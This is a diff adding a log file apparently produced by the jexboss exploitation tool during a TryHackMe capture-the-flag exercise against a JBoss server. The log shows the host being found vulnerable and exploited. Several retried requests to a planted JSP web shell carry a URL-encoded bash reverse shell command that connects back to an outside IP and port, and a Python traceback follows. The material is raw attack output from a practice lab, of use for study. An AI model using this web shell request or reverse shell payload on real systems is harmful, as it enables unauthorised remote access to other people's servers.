@@ -1,0 +1,47 @@
+2022-02-12 23:23:51,271 (INFO): Checking Host: http://jacobtheboss.box:8080/
+2022-02-12 23:23:53,114 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:23:53,549 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:23:54,140 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:24:11,153 (INFO): Checking Host: http://jacobtheboss.box:8080/
+2022-02-12 23:24:12,366 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:24:12,979 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:24:13,388 (INFO): Server http://jacobtheboss.box:8080/: VULNERABLE
+2022-02-12 23:24:36,941 (INFO): Server http://jacobtheboss.box:8080/ exploited!
+2022-02-12 23:25:31,666 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='jacobtheboss.box', port=8080): Read timed out. (read timeout=6.0)")': //jexws4/jexws4.jsp?ppp=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.172.114%2F4242+0%3E%261%27
+2022-02-12 23:25:37,862 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='jacobtheboss.box', port=8080): Read timed out. (read timeout=6.0)")': //jexws4/jexws4.jsp?ppp=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.172.114%2F4242+0%3E%261%27
+2022-02-12 23:25:44,383 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='jacobtheboss.box', port=8080): Read timed out. (read timeout=6.0)")': //jexws4/jexws4.jsp?ppp=bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.9.172.114%2F4242+0%3E%261%27
+2022-02-12 23:25:50,630 (INFO): Interrupting execution ...
+2022-02-12 23:25:50,633 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "/home/arundhanush/CTF/THM/jacobtheboss/jexboss/jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/request.py", line 75, in request
+    return self.request_encode_url(
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/request.py", line 97, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/poolmanager.py", line 330, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 747, in urlopen
+    return self.urlopen(
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 747, in urlopen
+    return self.urlopen(
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 747, in urlopen
+    return self.urlopen(
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 665, in urlopen
+    httplib_response = self._make_request(
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 421, in _make_request
+    six.raise_from(e, None)
+  File "<string>", line 3, in raise_from
+  File "/home/arundhanush/.local/lib/python3.9/site-packages/urllib3/connectionpool.py", line 416, in _make_request
+    httplib_response = conn.getresponse()
+  File "/usr/lib/python3.9/http/client.py", line 1377, in getresponse
+    response.begin()
+  File "/usr/lib/python3.9/http/client.py", line 320, in begin
+    version, status, reason = self._read_status()
+  File "/usr/lib/python3.9/http/client.py", line 281, in _read_status
+    line = str(self.fp.readline(_MAXLINE + 1), "iso-8859-1")
+  File "/usr/lib/python3.9/socket.py", line 704, in readinto
+    return self._sock.recv_into(b)
+  File "/home/arundhanush/CTF/THM/jacobtheboss/jexboss/jexboss.py", line 196, in handler_interrupt
+    exit(1)
+SystemExit: 1
